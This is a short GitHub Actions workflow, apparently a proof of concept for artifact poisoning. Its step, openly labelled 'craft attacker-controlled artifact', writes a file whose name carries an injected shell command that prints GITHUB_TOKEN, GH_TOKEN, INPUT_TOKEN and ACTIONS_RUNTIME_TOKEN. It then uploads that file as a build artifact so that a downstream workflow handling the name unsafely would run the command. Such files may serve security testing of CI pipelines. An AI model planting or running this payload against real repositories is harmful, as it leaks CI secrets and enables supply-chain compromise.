name: Test

on:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: craft attacker-controlled artifact
        run: |
          mkdir -p /tmp/content
          echo "${{ github.event.pull_request.number }}" > /tmp/content/pr_number.txt
          echo "report from forged Test workflow" > /tmp/content/report.txt
          python3 - <<'PY'
          open('/tmp/content/report.txt;printenv GITHUB_TOKEN GH_TOKEN INPUT_TOKEN ACTIONS_RUNTIME_TOKEN;true;#.txt','w').write('x')
          PY
          ls -1 /tmp/content
      - name: upload artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: contentdefault
          path: /tmp/content
          if-no-files-found: error
